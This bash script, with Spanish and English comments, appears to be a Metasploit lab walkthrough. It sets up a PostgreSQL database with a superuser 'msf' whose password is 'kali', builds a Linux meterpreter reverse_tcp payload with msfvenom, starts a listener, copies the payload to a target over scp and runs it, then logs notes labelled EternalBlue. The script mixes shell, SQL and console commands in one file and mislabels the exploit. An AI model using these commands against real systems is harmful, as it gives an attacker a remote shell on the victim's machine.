#!/bin/bash

# Part 1: Installing and Configuring PostgreSQL
# Install PostgreSQL
echo "Installing PostgreSQL..."
sudo apt update && sudo apt install -y postgresql
psql --version

# Start service PostgreSQL
echo "Iniciando el servicio de PostgreSQL..."
sudo service postgresql start

# Create a dedicated user for Metasploit
sudo -u postgres psql
CREATE USER msf WITH PASSWORD 'kali';
ALTER USER msf Superuser;
ALTER USER msf CREATEDB;

# Create the database
CREATE DATABASE msf_database OWNER msf;
\q


# Part 2: Basic usage of Metasploit
# Open Metasploit:
msfconsole
# Configure database settings:
db_connect msf:kali@127.0.0.1/msf_database

# Verify the connection to the database
echo "Verificando la conexión a la base de datos de Metasploit..."
db_status

# Exit msfconsole
exit


# Part 3: Payload Generation
echo "Generando un payload..."
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.9 LPORT=4444 -f elf > payload.elf

chmod +x payload.elf

# Part 4: 
# Open Metasploit:
msfconsole
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.1.9
set LPORT 4444
# Run in the background
exploit -j


# Step 5: Execute the Payload on the Target (Ubuntu System)
scp payload.elf msfadmin@192.168.1.10:/tmp

# Run the payload on the target machine
./payload.elf


# Part 6: Documentation and Loot
echo "Añadiendo notas..."
msfconsole -x "notes -t 'Exploit MS17_010' -l 'Explotando vulnerabilidad EternalBlue en <target_ip>'"
echo "Guardando loot..."
msfconsole -x "loot -t csv"
